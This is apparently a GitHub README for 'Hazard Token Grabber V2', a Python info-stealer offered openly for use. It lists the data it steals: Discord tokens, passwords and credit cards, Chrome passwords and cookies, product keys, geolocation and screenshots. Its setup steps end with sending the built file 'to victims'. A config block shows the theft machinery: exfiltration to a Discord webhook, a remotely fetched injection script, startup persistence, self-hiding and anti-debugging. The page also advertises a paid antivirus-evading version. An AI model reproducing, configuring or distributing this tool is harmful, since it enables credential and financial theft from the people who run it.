<h1 align="center">
  Hazard Token Grabber V2 🔰
</h1>

<p align="center"> 
  <kbd>
<img src="https://raw.githubusercontent.com/Rdimo/images/ef843c19b7dc2f65c6ace3d763c521d6218d7269/Hazard-Token-Grabber-V2/Hazardv2.jpg"></img>
  </kbd>
</p>

<p align="center">
  <img src="https://img.shields.io/github/languages/top/Rdimo/Hazard-Token-Grabber-V2?style=flat-square">
  <img src="https://img.shields.io/github/last-commit/Rdimo/Hazard-Token-Grabber-V2?style=flat-square">
  <img src="https://sonarcloud.io/api/project_badges/measure?project=Rdimo_Hazard-Token-Grabber-V2&metric=ncloc"/>
  <img src="https://img.shields.io/github/stars/Rdimo/Hazard-Token-Grabber-V2?color=%02B039&label=Stars&style=flat-square">
  <img src="https://img.shields.io/github/forks/Rdimo/Hazard-Token-Grabber-V2?color=%02B039&label=Forks&style=flat-square">
</p>

<h2 align="center">
  Hazard-Token-Grabber-V2 was made by

Love ❌ code ✅

</h2>

**NOTE:** This is a free software. It will **NOT** be undetected from antiviruses, or have custom features. If you want a better one, join [CheatAway](https://cheataway.com/invite) and purchase one. 
> [Why Hazardv2 won't be more OP](https://github.com/Rdimo/Hazard-Token-Grabber-V2/issues/314#issuecomment-1133918906)

---

## <a id="content"></a>🌐 〢 Content

- [🔰・Features](#features)
- [🌌・Discord](https://cheataway.com/invite)
- [🎉・Setting up Hazard Token Grabber.V2](#setup)
- [⚙・Config](#config)
- [📝・Changelog](#changelog)

## <a id="features"></a>🔰 〢 Features

```
> Windows Product Key & Build Info
> Pretty Fast Even if it Was Made With Python
> IP & Geolocation. (Country, City, Google Maps Location)
> A screenshot of all their monitors
> All valid/working discord tokens. (Bypasses BetterDiscord, Token Protector and Discord's new encryption)
> Their Passwords & Credit Cards for Discord (updates when they change it)
> All Passwords and Cookies from the Chrome Browser
> + More!
```

## <p align="left"><img src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/info.png">

---

## <a id="setup"></a> 📁 〢 Setting up Hazard Token Grabber.V2

1. Install [python](https://www.python.org/) and add it to [path](https://datatofish.com/add-python-to-windows-path/).
2. Open up [main.py](https://github.com/Rdimo/Hazard-Token-Grabber-V2/blob/master/main.py) with notepad or some other editor
3. Locate the config at the top of the file and Replace "WEBHOOK_HERE" with a discord webhook you've created. (Keep the quotes around the webhook)
4. Double Click `setup.bat` and allow it to finish.
5. A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
6. Send the file to victims. 😈

## <a id="config"></a>⚙ 〢 Config

If you Want to change the config, open up [main.py](https://github.com/Rdimo/Hazard-Token-Grabber-V2/blob/master/main.py) and locate it at the top. There you can configure the following:

```py
config = {
    # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
    # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
    'webhook': "WEBHOOK_HERE",
    # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
    'webhook_protector_key': "KEY_HERE",
    # keep it as it is unless you want to have a custom one
    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
    # set to False if you don't want it to kill programs such as discord upon running the exe
    'kill_processes': True,
    # if you want the file to run at startup
    'startup': True,
    # if you want the file to hide itself after run
    'hide_self': True,
    # does it's best to prevent the program from being debugged and drastically reduces the changes of your webhook being found
    'anti_debug': True,
    # this list of programs will be killed if hazard detects that any of these are running, you can add more if you want
    'blackListedPrograms':
    [
      ...
    ]

}
```

---

## <a id="changelog"></a>💭 〢 ChangeLog

```diff
v1.7.4 ⋮ 2022-05-31
+ exits if no internet connection was established.
+ made functions match the default regular expression ^[_a-z][a-z0-9_]*$
+ made classes match the default regular expression ^_?([A-Z_][a-zA-Z0-9]*|[a-z_][a-z0-9_]*)$

v1.7.2 ⋮ 2022-05-23
+ fixed bug were discord would still restart even if kill_processes was off

v1.7.1 ⋮ 2022-05-22
+ https://github.com/Rdimo/Discord-Webhook-Protector now works with the injection

v1.7.0 ⋮ 2022-05-22
+ Added support for https://github.com/Rdimo/Discord-Webhook-Protector

v1.6.9 ⋮ 2022-05-16
- Removed my accidently added webhook and enabled the defaults again,

v1.6.8 ⋮ 2022-05-16
+ fixed unpack valueError bug (https://github.com/Rdimo/Hazard-Token-Grabber-V2/issues/297)

v1.6.7 ⋮ 2022-05-15
+ fixed TypeError bug were loc could be a NoneType

v1.6.6 ⋮ 2022-05-11
+ updated token regex since discord update the auth token

v1.6.5 ⋮ 2022-05-7
+ bug fixes
+ cleaner code

v1.6.4 ⋮ 2022-05-01
+ anti-vm/debug
+ better encrypted token regex
+ bug fixes

v1.6.3 ⋮ 2022-04-24
+ fixed grab encrypted tokens from other discord versions
+ optimization
+ better handler
+ bug fixes

v1.6.2 ⋮ 2022-04-19
+ fixed decoding
+ better err handling

v1.6.1 ⋮ 2022-04-17
+ updated to discord_desktop_core-3

v1.6.0 ⋮ 2022-04-08
+ config to customize options
+ class object for general functions
+ threads and async functions making it 10x faster
+ decorator for the chrome grabbing functions
+ changed from requests to httpx for async lib
+ grabs disk and ram size
+ better builder
+ cleaner embed
+ formatted code
```
